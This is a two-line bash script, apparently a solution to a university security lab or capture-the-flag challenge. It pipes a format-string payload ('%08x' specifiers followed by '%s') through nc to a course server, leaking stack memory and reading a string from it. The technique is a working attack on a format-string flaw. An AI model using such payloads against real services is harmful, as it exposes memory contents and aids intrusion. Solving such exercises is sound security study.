#!/bin/bash

python3 -c "import sys; sys.stdout.buffer.write(b'%08x.%08x.%08x.%08x.%08x.%08x.%s' + b'\n')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 22190
